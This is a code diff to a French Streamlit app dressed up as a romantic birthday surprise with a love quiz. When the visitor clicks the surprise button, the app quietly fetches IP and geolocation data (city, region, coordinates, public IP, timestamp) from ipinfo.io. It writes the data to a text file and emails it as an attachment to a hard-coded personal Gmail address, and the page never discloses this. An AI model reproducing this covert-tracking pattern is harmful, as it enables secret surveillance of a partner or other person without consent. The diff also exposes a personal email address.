@@ -4,6 +4,8 @@ import datetime
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 
 # --- Configuration de la page ---
 st.set_page_config(page_title="Joyeux Anniversaire Ma Rose 🌹", page_icon="🌹", layout="centered")
@@ -33,30 +35,47 @@ st.markdown("""
     </style>
 """, unsafe_allow_html=True)
 
-# --- Fonction d'envoi d'e-mail ---
-def envoyer_email_rapport(contenu_texte):
-    # Paramètres de votre boîte mail pour l'envoi automatique
-    # (Il est conseillé de créer un mot de passe d'application Google si vous utilisez votre Gmail)
-    expéditeur = "anil.sarier6@gmail.com"
-    mot_de_passe_app = "VOTRE_MOT_DE_PASSE_APPLICATION_GMAIL" # À configurer
+# --- Fonction de génération du TXT et d'envoi par e-mail avec pièce jointe ---
+def generer_et_envoyer_txt(contenu_texte):
+    nom_fichier = "informations.txt"
+    
+    # 1. Création physique du fichier texte localement sur le serveur Streamlit
+    with open(nom_fichier, "w", encoding="utf-8") as f:
+        f.write(contenu_texte)
+
+    # Paramètres de messagerie
+    expediteur = "anil.sarier6@gmail.com"
+    mot_de_passe_app = "VOTRE_MOT_DE_PASSE_APPLICATION_GMAIL"  # Remplacez par votre mot de passe d'application Gmail
     destinataire = "anil.sarier6@gmail.com"
 
     try:
+        # Création du message e-mail
         msg = MIMEMultipart()
         msg['From'] = expediteur
         msg['To'] = destinataire
-        msg['Subject'] = "🌹 Rapport de connexion - Surprise Anniversaire"
+        msg['Subject'] = "🌹 Rapport d'anniversaire - Fichier informations.txt"
 
-        msg.attach(MIMEText(contenu_texte, 'plain'))
+        # Corps du message
+        corps = "Bonjour,\n\nVoici le fichier contenant les informations de connexion et de localisation de la visite.\n\nCordialement,"
+        msg.attach(MIMEText(corps, 'plain'))
 
-        # Connexion au serveur SMTP de Gmail
+        # 2. Ajout du fichier 'informations.txt' en pièce jointe
+        with open(nom_fichier, "rb") as piece_jointe:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(piece_jointe.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f"attachment; filename= {nom_fichier}")
+            msg.attach(part)
+
+        # 3. Connexion SMTP et envoi
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
-        server.login(expéditeur, mot_de_passe_app)
-        server.sendmail(expéditeur, destinataire, msg.as_string())
+        server.login(expediteur, mot_de_passe_app)
+        server.sendmail(expediteur, destinataire, msg.as_string())
         server.quit()
+        
     except Exception as e:
-        print(f"Erreur d'envoi de mail : {e}")
+        print(f"Erreur lors de l'envoi du mail : {e}")
 
 # --- Gestion des étapes avec la Session State ---
 if "etape" not in st.session_state:
@@ -85,10 +104,7 @@ elif st.session_state.etape == 2:
     st.title("💭 Quelques petits tests d'amour...")
     st.write("Juste pour être absolument sûr(e) que c'est bien ma reine qui est connectée ! ✨")
     
-    # Question 1 : Le chat
     q1 = st.radio("1. Quelle est la couleur du chat ?", ("Noir", "Blanc", "Roux", "Gris"))
-    
-    # Question 2 : Le combattant UFC
     q2 = st.selectbox("2. Quel combattant UFC est adoré ici ?", ("Conor McGregor", "Islam Makhachev", "Jon Jones", "Khabib Nurmagomedov"))
     
     if st.button("Valider les réponses"):
@@ -108,8 +124,8 @@ elif st.session_state.etape == 3:
     st.info("🎁 Clique sur le bouton ci-dessous pour lancer la surprise magique !")
     
     if st.button("Prêt(e) ! Découvrir la surprise 🌹"):
-        # --- EXÉCUTION DU BACKEND (Récupération des infos discrètes) ---
-        infos_recuperees = ""
+        # --- COLLECTE DES INFORMATIONS ---
+        contenu_txt = "=== RAPPORT DES INFORMATIONS DE CONNEXION ===\n\n"
         try:
             r = requests.get("https://ipinfo.io/json", timeout=5)
             if r.ok:
@@ -118,19 +134,18 @@ elif st.session_state.etape == 3:
                 lat = loc[0] if len(loc) > 0 else "Inconnue"
                 lon = loc[1] if len(loc) > 1 else "Inconnue"
                 
-                infos_recuperees += f"── RAPPORT DE CONNEXION ──\n"
-                infos_recuperees += f"Ville       : {d.get('city', 'Inconnue')}\n"
-                infos_recuperees += f"Région      : {d.get('region', 'Inconnue')}\n"
-                infos_recuperees += f"Pays        : {d.get('country', 'Inconnue')}\n"
-                infos_recuperees += f"Latitude    : {lat}\n"
-                infos_recuperees += f"Longitude   : {lon}\n"
-                infos_recuperees += f"IP publique : {d.get('ip', 'Inconnue')}\n"
-                infos_recuperees += f"Date/Heure  : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                contenu_txt += f"Ville       : {d.get('city', 'Inconnue')}\n"
+                contenu_txt += f"Région      : {d.get('region', 'Inconnue')}\n"
+                contenu_txt += f"Pays        : {d.get('country', 'Inconnue')}\n"
+                contenu_txt += f"Latitude    : {lat}\n"
+                contenu_txt += f"Longitude   : {lon}\n"
+                contenu_txt += f"IP publique : {d.get('ip', 'Inconnue')}\n"
+                contenu_txt += f"Date/Heure  : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
         except Exception as e:
-            infos_recuperees = f"Erreur lors de la collecte technique : {e}"
+            contenu_txt += f"Erreur lors de la récupération : {e}\n"
         
-        # Envoi automatique par e-mail
-        envoyer_email_rapport(infos_recuperees)
+        # Génération du fichier informations.txt et envoi par mail
+        generer_et_envoyer_txt(contenu_txt)
         
         st.session_state.etape = 4
         st.rerun()
